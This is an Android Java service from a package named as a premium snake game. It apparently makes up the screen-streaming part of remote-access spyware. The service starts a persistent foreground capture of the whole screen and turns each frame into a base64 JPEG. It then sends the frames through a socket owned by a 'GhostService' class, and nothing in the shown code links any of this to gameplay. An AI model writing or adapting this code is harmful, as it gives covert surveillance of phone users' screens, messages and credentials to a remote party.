package com.snakegame.premium;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.graphics.Bitmap;
import android.graphics.PixelFormat;
import android.hardware.display.DisplayManager;
import android.hardware.display.VirtualDisplay;
import android.media.Image;
import android.media.ImageReader;
import android.media.projection.MediaProjection;
import android.os.Build;
import android.os.Handler;
import android.os.HandlerThread;
import android.os.IBinder;
import android.util.Base64;
import android.util.DisplayMetrics;
import android.view.WindowManager;

import java.io.ByteArrayOutputStream;
import java.nio.ByteBuffer;

public class MediaProjectionService extends Service {
    private MediaProjection mediaProjection;
    private VirtualDisplay virtualDisplay;
    private ImageReader imageReader;
    private HandlerThread handlerThread;
    private Handler handler;
    private int width, height, dpi;

    @Override
    public void onCreate() {
        super.onCreate();
        startForeground(1, buildNotification());
        handlerThread = new HandlerThread("ScreenCapture");
        handlerThread.start();
        handler = new Handler(handlerThread.getLooper());
    }

    private Notification buildNotification() {
        String chId = "screen";
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel ch = new NotificationChannel(chId, "Screen", NotificationManager.IMPORTANCE_LOW);
            ((NotificationManager) getSystemService(NOTIFICATION_SERVICE)).createNotificationChannel(ch);
        }
        return new Notification.Builder(this, chId)
                .setContentTitle("Screen Recorder")
                .setSmallIcon(android.R.drawable.ic_menu_camera)
                .build();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        int resultCode = intent.getIntExtra("resultCode", -1);
        Intent data = intent.getParcelableExtra("data");
        if (resultCode != -1 && data != null) {
            mediaProjection = ((MediaProjectionManager) getSystemService(Context.MEDIA_PROJECTION_SERVICE))
                    .getMediaProjection(resultCode, data);
            startCapture();
        }
        return START_STICKY;
    }

    private void startCapture() {
        WindowManager wm = (WindowManager) getSystemService(WINDOW_SERVICE);
        DisplayMetrics metrics = new DisplayMetrics();
        wm.getDefaultDisplay().getMetrics(metrics);
        width = metrics.widthPixels;
        height = metrics.heightPixels;
        dpi = metrics.densityDpi;

        imageReader = ImageReader.newInstance(width, height, PixelFormat.RGBA_8888, 2);
        imageReader.setOnImageAvailableListener(reader -> {
            Image image = reader.acquireLatestImage();
            if (image != null) {
                Image.Plane[] planes = image.getPlanes();
                ByteBuffer buffer = planes[0].getBuffer();
                int pixelStride = planes[0].getPixelStride();
                int rowStride = planes[0].getRowStride();
                int rowPadding = rowStride - pixelStride * width;
                Bitmap bitmap = Bitmap.createBitmap(width + rowPadding / pixelStride, height, Bitmap.Config.ARGB_8888);
                bitmap.copyPixelsFromBuffer(buffer);
                Bitmap cropped = Bitmap.createBitmap(bitmap, 0, 0, width, height);
                ByteArrayOutputStream baos = new ByteArrayOutputStream();
                cropped.compress(Bitmap.CompressFormat.JPEG, 70, baos);
                String base64 = Base64.encodeToString(baos.toByteArray(), Base64.NO_WRAP);
                GhostService svc = GhostService.getInstance();
                if (svc != null && svc.getSocket() != null) {
                    svc.getSocket().send("screen_frame", base64);
                }
                image.close();
            }
        }, handler);

        virtualDisplay = mediaProjection.createVirtualDisplay("ScreenCapture",
                width, height, dpi, DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
                imageReader.getSurface(), null, handler);
    }

    @Override
    public void onDestroy() {
        if (virtualDisplay != null) virtualDisplay.release();
        if (imageReader != null) imageReader.close();
        if (mediaProjection != null) mediaProjection.stop();
        if (handlerThread != null) handlerThread.quitSafely();
        super.onDestroy();
    }

    @Override
    public IBinder onBind(Intent intent) { return null; }
}
